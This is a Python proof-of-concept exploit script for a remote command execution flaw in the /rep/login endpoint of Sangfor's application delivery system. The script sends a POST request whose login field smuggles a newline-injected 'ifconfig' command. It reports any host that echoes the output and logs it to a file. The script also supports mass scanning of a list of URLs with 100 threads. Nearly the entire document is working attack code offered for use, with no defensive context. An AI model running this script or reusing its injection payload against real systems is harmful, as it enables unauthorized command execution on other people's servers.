# -*- coding: utf-8 -*-
import argparse, sys, requests, re
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


def banner():
    test = """ 
   _____ _               __   _______       ______     
  / ____| |              \ \ / /_   _|     |  ____|    
 | (___ | |__   ___ _ __  \ V /  | |  _ __ | |__ _   _ 
  \___ \| '_ \ / _ \ '_ \  > <   | | | '_ \|  __| | | |
  ____) | | | |  __/ | | |/ . \ _| |_| | | | |  | |_| |
 |_____/|_| |_|\___|_| |_/_/ \_\_____|_| |_|_|   \__,_|
                                                 
                                            tag :  深信服应用交付系统 /rep/login 远程命令执行漏洞poc
                                                                             @author : Gui1de
    """
    print(test)


headers = {
    "Accept": "*/*",
    "Connection": "Keep-Alive",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36"
}


def poc(target):
    url = target + "/rep/login"
    data = {"clsMode": "cls_mode_login\nifconfig\n", "index": "index", "log_type": "report", "loginType": "account", "page": "login", "rnd": "0", "userID": "admin", "userPsw": "123\r\n"}
    try:
        res = requests.post(url, headers=headers, data=data, verify=False, timeout=5).text
        if 'inet' in res:
            print(f"[+]{target} 存在漏洞\n{url}\n输出结果为{res}\n")
                # print("点击"+url2+"进行验证")
            with open("result.txt", "a+", encoding="utf-8") as f:
                    f.write(target + "\n")
        else:
            print(f"[-] {target} 不存在漏洞 {res}")
    except:
        print(f"[*] {target} 请求失败")


def main():
    banner()
    parser = argparse.ArgumentParser(description='深信服应用交付系统 /rep/login 远程命令执行漏洞')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()